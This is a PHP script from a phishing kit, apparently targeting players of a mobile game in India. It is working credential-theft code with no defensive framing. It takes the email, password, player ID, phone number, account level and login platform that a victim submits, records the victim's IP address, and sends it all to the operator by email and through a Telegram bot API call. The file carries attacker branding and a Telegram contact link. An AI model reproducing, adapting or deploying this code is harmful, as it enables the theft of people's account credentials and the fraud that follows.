<?php

include 'system/setting.php';
include 'system/cheifip.php';
include 'email.php';
include 'bot.php';

$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$login = $_POST['login'];


if($email == "" && $password == "" && $playid == "" && $phone == "" && $level == "" && $login == ""){
header("Location: index.php");
}else{


$subjek = " 🇮🇳 | +91 | LEVEL $level |⚡ professor deepu⚡ |RESULTS $email | LOGIN $login";
$pesan = '
<center>
<div border="1" style="border-collapse: collapse; border: 1px solid black; background: url(https://i.ibb.co/8dmqCXS/20231022-131808.jpg no-repeat center center; background-size: 100% 100%; width: 294; height: 200px; color: #000; text-align: center;"></div>
<div style="border:2px solid black;width: 294; font-weight:bold; height: 20px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; text-align:center;">
DATA INFO | Sent : '.$jamasuk.'
</div>
<table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:linear-gradient(90deg,black,#800080);">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$phone.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$level.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$login.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>IP ADRESS</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$agung_ip_address.'</th> 
</tr>
</table>
<div style="border:2px solid white;width: 294; font-weight:bold; height: 20px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; text-align:center;">
ADDITIONAL INFORMATION
</div>
<table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:linear-gradient(90deg,black,#800080);">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>DATE & TIME</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
<tr>    
                <th style="padding-left: 10px; width: 35%; text-align: left;" height="25px"><b>WANNA SE ME ?</th>
                <th style="width: 65%; text-align: center;"><b><a href="https://t.me/shifax_prime">CLICK HERE</a></th> 
            </tr>
</table>
 <center>
';

// Load previous result number
$result_file = 'result_counter.txt';
if (file_exists($result_file)) {
    $result_number = (int)file_get_contents($result_file);
} else {
    $result_number = 1; // Start from 1 if no file exists
}

// Get the current date (DD/MM/YY format)
$date = date("d/m/y");

// Create the message with monospace and structured format
$msg = "```\n";
$msg .= "╭➤ 𝐑𝐄𝐒𝐔𝐋𝐓 #$result_number | $date\n\n";
$msg .= "╰➤ 𝐏𝐥𝐚𝐲𝐞𝐫 𝐈𝐃       : $playid\n\n";
$msg .= "╰➤ 𝐄𝐦𝐚𝐢𝐥/𝐏𝐡𝐨𝐧𝐞    : $email\n\n";
$msg .= "╰➤ 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝       : $password\n\n";
$msg .= "╰➤ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦       : $login\n\n";
$msg .= "╰➤ 𝐋𝐞𝐯𝐞𝐥         : $level\n\n";
$msg .= "╰➤ 𝐏𝐡𝐨𝐧𝐞         : $phone\n\n";
$msg .= "╰➤ 𝐈𝐏 𝐀𝐝𝐝𝐫𝐞𝐬𝐬     : $agung_ip_address\n\n";
$msg .= "╰➤ 𝐃𝐀𝐓𝐀 𝐒𝐄𝐍𝐃 𝐁𝐘   : @professor_deepu\n";
$msg .= "```";

// Increment the result number and save it
$result_number++;
file_put_contents($result_file, $result_number);
// Increment the result number and save it
$result_number++;
file_put_contents($result_file, $result_number);

include 'bot.php';
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);


}
?>